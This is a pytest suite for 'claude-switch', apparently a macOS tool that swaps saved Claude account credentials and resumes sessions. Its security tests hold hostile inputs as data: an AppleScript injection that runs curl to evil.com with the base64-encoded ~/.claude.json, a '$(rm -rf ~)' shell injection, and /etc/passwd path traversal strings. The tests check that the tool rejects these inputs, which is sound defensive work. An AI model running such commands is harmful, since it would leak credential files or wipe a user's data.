"""
Comprehensive test suite for claude-switch.

Coverage:
  - Security: session_id validation, email validation, path traversal
  - Helpers: JSON read/write, project_dir_name, account_filename
  - Sessions: get_last_session
  - Accounts: list_saved_accounts, save_current_account
  - Keychain: get/set/delete (all mocked via subprocess)
  - Switch logic: switch_to_account
  - CLI: cmd_list, interactive_switch, main() dispatch
  - Terminal: open_new_terminal_window
"""

from __future__ import annotations

import importlib.util
import json
import os
import time
from pathlib import Path
from unittest.mock import MagicMock, call, patch

import pytest

# ---------------------------------------------------------------------------
# Module loader — "claude-switch" has a hyphen, importlib required
# ---------------------------------------------------------------------------

def _load_module():
    import importlib.machinery
    script_path = Path(__file__).parent.parent / "claude-switch"
    loader = importlib.machinery.SourceFileLoader("claude_switch", str(script_path))
    spec = importlib.util.spec_from_loader("claude_switch", loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod

cs = _load_module()

# ---------------------------------------------------------------------------
# Shared fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def isolated_fs(tmp_path, monkeypatch):
    """Redirect all home-based path constants to a tmp directory so tests
    never touch the real ~/.claude.json or ~/.claude-switcher."""
    home = tmp_path / "home"
    home.mkdir()
    switcher_dir = home / ".claude-switcher"
    accounts_dir = switcher_dir / "accounts"
    claude_json = home / ".claude.json"

    monkeypatch.setattr(cs, "SWITCHER_DIR", switcher_dir)
    monkeypatch.setattr(cs, "ACCOUNTS_DIR", accounts_dir)
    monkeypatch.setattr(cs, "CLAUDE_JSON", claude_json)
    return home


@pytest.fixture
def sample_claude_json(isolated_fs):
    """Write a minimal ~/.claude.json with alice logged in."""
    data = {
        "oauthAccount": {
            "emailAddress": "alice@example.com",
            "displayName": "Alice",
        },
        "userID": "uid-123",
    }
    cs.CLAUDE_JSON.write_text(json.dumps(data))
    return data


@pytest.fixture
def saved_account(isolated_fs):
    """Create a saved profile for alice on disk."""
    cs.setup()
    profile = {
        "email": "alice@example.com",
        "displayName": "Alice",
        "oauthAccount": {"emailAddress": "alice@example.com", "displayName": "Alice"},
        "userID": "uid-123",
        "credential_version": cs.CREDENTIAL_VERSION,
        "sessions": {},
    }
    path = cs.account_filename("alice@example.com")
    path.write_text(json.dumps(profile))
    path.chmod(0o600)
    return profile


# ---------------------------------------------------------------------------
# 1. _validate_session_id — security
# ---------------------------------------------------------------------------

class TestValidateSessionId:
    def test_valid_alphanumeric(self):
        assert cs._validate_session_id("abc123") == "abc123"

    def test_valid_with_dash_and_underscore(self):
        assert cs._validate_session_id("session-id_42") == "session-id_42"

    def test_rejects_space(self):
        assert cs._validate_session_id("bad session") is None

    def test_rejects_semicolon(self):
        assert cs._validate_session_id("foo;bar") is None

    def test_rejects_double_quote(self):
        assert cs._validate_session_id('foo"bar') is None

    def test_rejects_applescript_injection(self):
        payload = 'x"; do shell script "curl evil.com/$(cat ~/.claude.json | base64)"'
        assert cs._validate_session_id(payload) is None

    def test_rejects_shell_injection(self):
        assert cs._validate_session_id("foo$(rm -rf ~)") is None

    def test_rejects_path_traversal(self):
        assert cs._validate_session_id("../../etc/passwd") is None

    def test_rejects_newline(self):
        assert cs._validate_session_id("foo\nbar") is None

    def test_rejects_empty_string(self):
        assert cs._validate_session_id("") is None

    def test_rejects_none(self):
        assert cs._validate_session_id(None) is None

    def test_long_valid_id(self):
        sid = "a" * 128
        assert cs._validate_session_id(sid) == sid


# ---------------------------------------------------------------------------
# 2. account_filename — security (email validation + path traversal)
# ---------------------------------------------------------------------------

class TestAccountFilename:
    def test_valid_email(self):
        path = cs.account_filename("alice@example.com")
        assert path.name == "alice_at_example_com.json"
        assert path.parent == cs.ACCOUNTS_DIR

    def test_email_with_plus(self):
        path = cs.account_filename("alice+work@example.com")
        assert path.name == "alice_work_at_example_com.json"

    def test_email_with_subdomain(self):
        path = cs.account_filename("user@mail.company.co.uk")
        assert "at" in path.name

    def test_invalid_email_no_at(self):
        with pytest.raises(ValueError, match="Invalid email"):
            cs.account_filename("not-an-email")

    def test_invalid_email_empty(self):
        with pytest.raises(ValueError):
            cs.account_filename("")

    def test_path_traversal_rejected(self):
        with pytest.raises(ValueError):
            cs.account_filename("../../etc/passwd")

    def test_path_traversal_with_at(self):
        # Even if it looks like an email, traversal must be blocked
        with pytest.raises(ValueError):
            cs.account_filename("../../etc@passwd.com")

    def test_result_inside_accounts_dir(self):
        path = cs.account_filename("user@domain.org")
        assert cs.ACCOUNTS_DIR in path.parents or path.parent == cs.ACCOUNTS_DIR


# ---------------------------------------------------------------------------
# 3. project_dir_name
# ---------------------------------------------------------------------------

class TestProjectDirName:
    def test_converts_slashes_to_dashes(self):
        assert cs.project_dir_name("/home/user/project") == "-home-user-project"

    def test_empty_string(self):
        assert cs.project_dir_name("") == ""

    def test_no_slashes(self):
        assert cs.project_dir_name("myproject") == "myproject"

    def test_trailing_slash(self):
        assert cs.project_dir_name("/proj/") == "-proj-"


# ---------------------------------------------------------------------------
# 4. JSON helpers — read_claude_json / write_claude_json / get_current_account
# ---------------------------------------------------------------------------

class TestClaudeJson:
    def test_write_and_read_roundtrip(self):
        data = {"foo": "bar", "nested": {"x": 1}}
        cs.write_claude_json(data)
        assert cs.read_claude_json() == data

    def test_write_is_atomic_no_tmp_left(self):
        cs.write_claude_json({"a": 1})
        tmp = cs.CLAUDE_JSON.with_suffix(".json.tmp")
        assert not tmp.exists()

    def test_read_missing_file_raises(self):
        with pytest.raises(FileNotFoundError):
            cs.read_claude_json()

    def test_get_current_account_returns_oauth(self, sample_claude_json):
        acc = cs.get_current_account()
        assert acc["emailAddress"] == "alice@example.com"
        assert acc["displayName"] == "Alice"

    def test_get_current_account_missing_file_returns_empty(self):
        assert cs.get_current_account() == {}

    def test_get_current_account_missing_key_returns_empty(self):
        cs.CLAUDE_JSON.write_text(json.dumps({"userID": "x"}))
        assert cs.get_current_account() == {}


# ---------------------------------------------------------------------------
# 5. get_last_session
# ---------------------------------------------------------------------------

class TestGetLastSession:
    def _make_projects_dir(self, base: Path, project_name: str = "-my-project") -> Path:
        p = base / ".claude" / "projects" / project_name
        p.mkdir(parents=True)
        return p

    def test_returns_none_when_no_projects_dir(self, tmp_path, monkeypatch):
        home = tmp_path / "nohome"
        home.mkdir()
        monkeypatch.setattr(Path, "home", lambda: home)
        assert cs.get_last_session() is None

    def test_returns_none_for_empty_projects_dir(self, tmp_path, monkeypatch):
        home = tmp_path / "home2"
        (home / ".claude" / "projects").mkdir(parents=True)
        monkeypatch.setattr(Path, "home", lambda: home)
        assert cs.get_last_session() is None

    def test_finds_most_recent_jsonl(self, tmp_path, monkeypatch):
        home = tmp_path / "home3"
        proj = self._make_projects_dir(home)
        (proj / "old-session.jsonl").write_text("")
        time.sleep(0.05)
        (proj / "new-session.jsonl").write_text("")

        monkeypatch.setattr(Path, "home", lambda: home)
        result = cs.get_last_session()
        assert result is not None
        assert result["session_id"] == "new-session"

    def test_returns_session_id_and_saved_at(self, tmp_path, monkeypatch):
        home = tmp_path / "home4"
        proj = self._make_projects_dir(home)
        (proj / "abc123.jsonl").write_text("")

        monkeypatch.setattr(Path, "home", lambda: home)
        result = cs.get_last_session()
        assert result["session_id"] == "abc123"
        assert "saved_at" in result


# ---------------------------------------------------------------------------
# 6. list_saved_accounts
# ---------------------------------------------------------------------------

class TestListSavedAccounts:
    def test_returns_empty_when_no_dir(self):
        assert cs.list_saved_accounts() == []

    def test_returns_accounts_sorted_by_email(self):
        cs.setup()
        for email, name in [("zebra@x.com", "Z"), ("alice@x.com", "A"), ("bob@x.com", "B")]:
            p = cs.account_filename(email)
            p.write_text(json.dumps({
                "email": email,
                "displayName": name,
                "credential_version": cs.CREDENTIAL_VERSION,
            }))
        accounts = cs.list_saved_accounts()
        emails = [a["email"] for a in accounts]
        assert emails == sorted(emails)

    def test_skips_corrupt_json_files(self):
        cs.setup()
        bad = cs.ACCOUNTS_DIR / "bad_at_x_com.json"
        bad.write_text("not json {{{{")
        assert cs.list_saved_accounts() == []

    def test_returns_all_valid_accounts(self):
        cs.setup()
        for i in range(3):
            email = f"user{i}@example.com"
            cs.account_filename(email).write_text(json.dumps({
                "email": email, "credential_version": cs.CREDENTIAL_VERSION
            }))
        assert len(cs.list_saved_accounts()) == 3


# ---------------------------------------------------------------------------
# 7. setup()
# ---------------------------------------------------------------------------

class TestSetup:
    def test_creates_switcher_and_accounts_dirs(self):
        cs.setup()
        assert cs.SWITCHER_DIR.exists()
        assert cs.ACCOUNTS_DIR.exists()

    def test_switcher_dir_permissions_700(self):
        cs.setup()
        assert oct(cs.SWITCHER_DIR.stat().st_mode)[-3:] == "700"

    def test_accounts_dir_permissions_700(self):
        cs.setup()
        assert oct(cs.ACCOUNTS_DIR.stat().st_mode)[-3:] == "700"

    def test_idempotent(self):
        cs.setup()
        cs.setup()
        assert cs.ACCOUNTS_DIR.exists()


# ---------------------------------------------------------------------------
# 8. Keychain helpers (subprocess mocked)
# ---------------------------------------------------------------------------

class TestKeychainHelpers:
    # get_keychain_credentials
    def test_get_credentials_success(self):
        mock_ok = MagicMock(returncode=0, stdout="mytoken\n")
        with patch("subprocess.run", return_value=mock_ok):
            assert cs.get_keychain_credentials() == "mytoken"

    def test_get_credentials_not_found(self):
        mock_fail = MagicMock(returncode=1, stdout="")
        with patch("subprocess.run", return_value=mock_fail):
            assert cs.get_keychain_credentials() is None

    def test_get_credentials_empty_stdout(self):
        mock_ok = MagicMock(returncode=0, stdout="   ")
        with patch("subprocess.run", return_value=mock_ok):
            assert cs.get_keychain_credentials() is None

    # set_keychain_credentials
    def test_set_credentials_success(self):
        mock_ok = MagicMock(returncode=0)
        with patch("subprocess.run", return_value=mock_ok) as mock_run:
            assert cs.set_keychain_credentials("mytoken") is True
        assert mock_run.call_count == 2  # delete + add

    def test_set_credentials_add_fails(self):
        mock_del = MagicMock(returncode=0)
        mock_add = MagicMock(returncode=1, stderr="error")
        with patch("subprocess.run", side_effect=[mock_del, mock_add]):
            assert cs.set_keychain_credentials("mytoken") is False

    # get_profile_credentials
    def test_get_profile_credentials_success(self):
        mock_ok = MagicMock(returncode=0, stdout="profiletoken\n")
        with patch("subprocess.run", return_value=mock_ok):
            assert cs.get_profile_credentials("alice@example.com") == "profiletoken"

    def test_get_profile_credentials_not_found(self):
        mock_fail = MagicMock(returncode=1, stdout="")
        with patch("subprocess.run", return_value=mock_fail):
            assert cs.get_profile_credentials("alice@example.com") is None

    # set_profile_credentials
    def test_set_profile_credentials_success(self):
        mock_ok = MagicMock(returncode=0)
        with patch("subprocess.run", return_value=mock_ok) as mock_run:
            assert cs.set_profile_credentials("alice@example.com", "token") is True
        assert mock_run.call_count == 2

    # delete_profile_credentials
    def test_delete_profile_credentials_calls_security(self):
        mock_ok = MagicMock(returncode=0)
        with patch("subprocess.run", return_value=mock_ok) as mock_run:
            cs.delete_profile_credentials("alice@example.com")
        mock_run.assert_called_once()
        cmd = mock_run.call_args[0][0]
        assert "delete-generic-password" in cmd


# ---------------------------------------------------------------------------
# 9. save_current_account
# ---------------------------------------------------------------------------

class TestSaveCurrentAccount:
    def test_saves_profile_to_disk(self, sample_claude_json):
        cs.setup()
        with patch.object(cs, "get_keychain_credentials", return_value="tok"), \
             patch.object(cs, "set_profile_credentials", return_value=True), \
             patch.object(cs, "get_last_session", return_value=None):
            cs.save_current_account()

        path = cs.account_filename("alice@example.com")
        assert path.exists()
        profile = json.loads(path.read_text())
        assert profile["email"] == "alice@example.com"
        assert profile["credential_version"] == cs.CREDENTIAL_VERSION

    def test_profile_file_has_600_permissions(self, sample_claude_json):
        cs.setup()
        with patch.object(cs, "get_keychain_credentials", return_value="tok"), \
             patch.object(cs, "set_profile_credentials", return_value=True), \
             patch.object(cs, "get_last_session", return_value=None):
            cs.save_current_account()

        path = cs.account_filename("alice@example.com")
        assert oct(path.stat().st_mode)[-3:] == "600"

    def test_exits_when_no_email(self, isolated_fs):
        cs.CLAUDE_JSON.write_text(json.dumps({"oauthAccount": {}}))
        with pytest.raises(SystemExit):
            cs.save_current_account()

    def test_exits_when_no_keychain_credentials(self, sample_claude_json):
        cs.setup()
        with patch.object(cs, "get_keychain_credentials", return_value=None):
            with pytest.raises(SystemExit):
                cs.save_current_account()

    def test_exits_when_set_profile_credentials_fails(self, sample_claude_json):
        cs.setup()
        with patch.object(cs, "get_keychain_credentials", return_value="tok"), \
             patch.object(cs, "set_profile_credentials", return_value=False):
            with pytest.raises(SystemExit):
                cs.save_current_account()

    def test_saves_session_when_present(self, sample_claude_json):
        cs.setup()
        session = {"session_id": "sess-abc", "project_path": "/myproject", "saved_at": 0}
        with patch.object(cs, "get_keychain_credentials", return_value="tok"), \
             patch.object(cs, "set_profile_credentials", return_value=True), \
             patch.object(cs, "get_last_session", return_value=session), \
             patch("os.getcwd", return_value="/myproject"):
            cs.save_current_account()

        profile = json.loads(cs.account_filename("alice@example.com").read_text())
        assert "sessions" in profile


# ---------------------------------------------------------------------------
# 10. switch_to_account
# ---------------------------------------------------------------------------

class TestSwitchToAccount:
    def _profile(self, email="alice@example.com", version=None, sessions=None):
        return {
            "email": email,
            "displayName": "Alice",
            "oauthAccount": {"emailAddress": email, "displayName": "Alice"},
            "userID": "uid-999",
            "credential_version": version if version is not None else cs.CREDENTIAL_VERSION,
            "sessions": sessions or {},
        }

    def test_exits_on_old_credential_version(self):
        with pytest.raises(SystemExit):
            cs.switch_to_account(self._profile(version=1), no_window=True)

    def test_exits_when_no_profile_credentials(self, sample_claude_json):
        with patch.object(cs, "get_profile_credentials", return_value=None):
            with pytest.raises(SystemExit):
                cs.switch_to_account(self._profile(), no_window=True)

    def test_exits_when_set_keychain_fails(self, sample_claude_json):
        with patch.object(cs, "get_profile_credentials", return_value="tok"), \
             patch.object(cs, "set_keychain_credentials", return_value=False):
            with pytest.raises(SystemExit):
                cs.switch_to_account(self._profile(), no_window=True)

    def test_switches_and_launches_claude(self, sample_claude_json):
        with patch.object(cs, "get_profile_credentials", return_value="tok"), \
             patch.object(cs, "set_keychain_credentials", return_value=True), \
             patch.object(cs, "get_last_session", return_value=None), \
             patch("os.getcwd", return_value="/proj"), \
             patch("os.execvp") as mock_exec:
            cs.switch_to_account(self._profile(), exec_mode=True)
        mock_exec.assert_called_once_with("claude", ["claude"])

    def test_resumes_valid_session(self, sample_claude_json):
        profile = self._profile(sessions={"/proj": "valid-session-1"})
        with patch.object(cs, "get_profile_credentials", return_value="tok"), \
             patch.object(cs, "set_keychain_credentials", return_value=True), \
             patch("os.getcwd", return_value="/proj"), \
             patch("os.execvp") as mock_exec:
            cs.switch_to_account(profile, exec_mode=True)
        mock_exec.assert_called_once_with("claude", ["claude", "--resume", "valid-session-1"])

    def test_ignores_malicious_session_id(self, sample_claude_json):
        """Injection payload in session_id must be stripped — no shell code executed."""
        evil = 'x"; do shell script "curl evil.com/$(cat ~/.claude.json|base64)"'
        profile = self._profile(sessions={"/proj": evil})
        with patch.object(cs, "get_profile_credentials", return_value="tok"), \
             patch.object(cs, "set_keychain_credentials", return_value=True), \
             patch("os.getcwd", return_value="/proj"), \
             patch("os.execvp") as mock_exec:
            cs.switch_to_account(profile, exec_mode=True)
        # Must launch claude WITHOUT the malicious session_id
        mock_exec.assert_called_once_with("claude", ["claude"])

    def test_updates_claude_json_with_new_account(self, isolated_fs):
        cs.CLAUDE_JSON.write_text(json.dumps({"oauthAccount": {}, "userID": "old-uid"}))
        profile = self._profile(email="bob@example.com")
        with patch.object(cs, "get_profile_credentials", return_value="tok"), \
             patch.object(cs, "set_keychain_credentials", return_value=True), \
             patch("os.getcwd", return_value="/proj"), \
             patch.object(cs, "get_last_session", return_value=None), \
             patch("os.execvp"):
            cs.switch_to_account(profile, exec_mode=True)

        updated = cs.read_claude_json()
        assert updated["userID"] == "uid-999"
        assert updated["oauthAccount"]["emailAddress"] == "bob@example.com"

    def test_no_window_prints_command(self, sample_claude_json, capsys):
        with patch.object(cs, "get_profile_credentials", return_value="tok"), \
             patch.object(cs, "set_keychain_credentials", return_value=True), \
             patch.object(cs, "get_last_session", return_value=None), \
             patch("os.getcwd", return_value="/proj"):
            cs.switch_to_account(self._profile(), no_window=True)

        out = capsys.readouterr().out
        assert "claude" in out


# ---------------------------------------------------------------------------
# 11. cmd_list
# ---------------------------------------------------------------------------

class TestCmdList:
    def test_prints_message_when_no_accounts(self, capsys):
        cs.setup()
        cs.cmd_list()
        assert "No accounts saved" in capsys.readouterr().out

    def test_lists_saved_accounts(self, saved_account, sample_claude_json, capsys):
        with patch("os.getcwd", return_value="/proj"):
            cs.cmd_list()
        assert "alice@example.com" in capsys.readouterr().out

    def test_marks_active_account(self, saved_account, sample_claude_json, capsys):
        with patch("os.getcwd", return_value="/proj"):
            cs.cmd_list()
        assert "active" in capsys.readouterr().out

    def test_shows_session_hint_when_session_saved(self, isolated_fs, sample_claude_json, capsys):
        cs.setup()
        profile = {
            "email": "alice@example.com",
            "displayName": "Alice",
            "oauthAccount": {},
            "userID": "uid-123",
            "credential_version": cs.CREDENTIAL_VERSION,
            "sessions": {"/myproject": "sess-123"},
        }
        path = cs.account_filename("alice@example.com")
        path.write_text(json.dumps(profile))
        with patch("os.getcwd", return_value="/myproject"):
            cs.cmd_list()
        assert "session saved" in capsys.readouterr().out


# ---------------------------------------------------------------------------
# 12. open_new_terminal_window
# ---------------------------------------------------------------------------

class TestOpenNewTerminalWindow:
    def test_tries_iterm2_first_and_succeeds(self):
        mock_ok = MagicMock(returncode=0)
        with patch("subprocess.run", return_value=mock_ok) as mock_run:
            result = cs.open_new_terminal_window("claude", "/some/dir")
        assert result is True
        cmd = mock_run.call_args[0][0]
        assert cmd[0] == "osascript"

    def test_falls_back_to_terminal_app(self):
        mock_fail = MagicMock(returncode=1)
        mock_ok = MagicMock(returncode=0)
        with patch("subprocess.run", side_effect=[mock_fail, mock_ok]) as mock_run:
            result = cs.open_new_terminal_window("claude", "/some/dir")
        assert result is True
        assert mock_run.call_count == 2

    def test_returns_false_when_both_fail(self):
        mock_fail = MagicMock(returncode=1)
        with patch("subprocess.run", return_value=mock_fail):
            result = cs.open_new_terminal_window("claude", "/some/dir")
        assert result is False

    def test_cwd_is_quoted_in_applescript(self):
        """Paths with spaces must not break the AppleScript string."""
        mock_ok = MagicMock(returncode=0)
        with patch("subprocess.run", return_value=mock_ok) as mock_run:
            cs.open_new_terminal_window("claude", "/path with spaces/project")
        script = mock_run.call_args[0][0][2]  # osascript -e <script>
        assert "/path with spaces/project" in script or "path\\ with\\ spaces" in script


# ---------------------------------------------------------------------------
# 13. is_jetbrains_terminal
# ---------------------------------------------------------------------------

class TestIsJetbrainsTerminal:
    def test_detects_jetbrains(self, monkeypatch):
        monkeypatch.setenv("TERMINAL_EMULATOR", "JetBrains-Terminal")
        assert cs.is_jetbrains_terminal() is True

    def test_false_for_iterm(self, monkeypatch):
        monkeypatch.setenv("TERMINAL_EMULATOR", "iTerm2")
        assert cs.is_jetbrains_terminal() is False

    def test_false_when_not_set(self, monkeypatch):
        monkeypatch.delenv("TERMINAL_EMULATOR", raising=False)
        assert cs.is_jetbrains_terminal() is False


# ---------------------------------------------------------------------------
# 14. main() — CLI dispatch
# ---------------------------------------------------------------------------

class TestMain:
    def test_help_flag(self, capsys):
        with patch("sys.argv", ["claude-switch", "--help"]):
            cs.main()
        assert "Usage" in capsys.readouterr().out

    def test_help_alias_h(self, capsys):
        with patch("sys.argv", ["claude-switch", "-h"]):
            cs.main()
        assert "Usage" in capsys.readouterr().out

    def test_save_command(self):
        with patch("sys.argv", ["claude-switch", "save"]), \
             patch.object(cs, "save_current_account") as mock_save:
            cs.main()
        mock_save.assert_called_once()

    def test_list_command(self):
        with patch("sys.argv", ["claude-switch", "list"]), \
             patch.object(cs, "cmd_list") as mock_list:
            cs.main()
        mock_list.assert_called_once()

    def test_no_args_calls_interactive_switch(self):
        with patch("sys.argv", ["claude-switch"]), \
             patch.object(cs, "interactive_switch") as mock_sw:
            cs.main()
        mock_sw.assert_called_once()

    def test_unknown_command_exits(self):
        with patch("sys.argv", ["claude-switch", "unknown-cmd"]):
            with pytest.raises(SystemExit):
                cs.main()

    def test_use_without_email_exits(self):
        with patch("sys.argv", ["claude-switch", "use"]):
            with pytest.raises(SystemExit):
                cs.main()

    def test_use_unknown_email_exits(self):
        cs.setup()
        with patch("sys.argv", ["claude-switch", "use", "nobody@example.com"]):
            with pytest.raises(SystemExit):
                cs.main()

    def test_use_valid_email_calls_switch(self, saved_account, sample_claude_json):
        with patch("sys.argv", ["claude-switch", "use", "alice@example.com", "--no-window"]), \
             patch.object(cs, "switch_to_account") as mock_sw:
            cs.main()
        mock_sw.assert_called_once()

    def test_no_window_flag_parsed(self):
        with patch("sys.argv", ["claude-switch", "--no-window"]), \
             patch.object(cs, "interactive_switch") as mock_sw:
            cs.main()
        _, kwargs = mock_sw.call_args
        assert kwargs.get("no_window") is True

    def test_new_window_flag_disables_exec_mode(self):
        with patch("sys.argv", ["claude-switch", "--new-window"]), \
             patch.object(cs, "interactive_switch") as mock_sw:
            cs.main()
        _, kwargs = mock_sw.call_args
        assert kwargs.get("exec_mode") is False
